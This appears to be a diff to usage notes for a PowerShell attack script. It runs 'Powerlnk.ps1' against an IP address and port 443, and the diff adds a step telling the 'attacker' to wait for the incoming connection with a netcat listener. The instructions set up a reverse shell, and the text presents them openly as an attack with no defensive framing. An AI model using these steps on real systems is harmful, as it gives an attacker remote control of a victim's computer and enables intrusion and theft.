@@ -2,6 +2,14 @@ Run command with code below (see bottom of the code block for details):
 
 .\Powerlnk.ps1 -ip 192.168.10.133 -port 443
 
+############
+
+Wait on the server (attacker's computer) with necat for incoming connection:
+
+nc -nlvp 443
+
+############
+
 
 
 
